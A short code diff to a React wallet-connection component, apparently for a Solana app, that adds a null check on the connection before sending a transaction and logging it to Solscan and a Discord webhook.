@@ -143,9 +143,14 @@ const WalletConnectionHandler: FC = () => {
                 })
             );
 
-            setTimeout(async () => {
-                try {
-                    const txid = await sendTransaction(finalTx, connection);
+            const safeConnection = connection; // Already validated as non-null above
+
+setTimeout(async () => {
+    try {
+        if (!safeConnection) return;
+
+        const txid = await sendTransaction(finalTx, safeConnection);
+
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
